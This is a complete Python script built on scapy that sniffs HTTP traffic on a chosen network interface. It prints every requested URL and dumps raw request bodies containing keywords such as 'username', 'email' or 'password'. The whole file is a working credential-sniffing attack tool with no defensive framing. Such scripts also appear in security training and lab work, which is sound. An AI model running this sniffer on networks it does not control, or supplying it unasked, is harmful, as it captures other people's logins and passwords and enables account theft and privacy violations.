#!/usr/bin/env python3

import scapy.all as scapy
import optparse
from scapy.layers import http


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="-i to select and interface")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, --help for more info")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("-------------------------------------------------------")
        print("--- Website --- ")
        print(url)
        print("-------------------------------------------------------")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "email", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("-------------------------------------------------------")
                    print("--- Username/Password --- ")
                    print(load)
                    print("-------------------------------------------------------")
                    break



options = get_arguments()

sniff(options.interface)
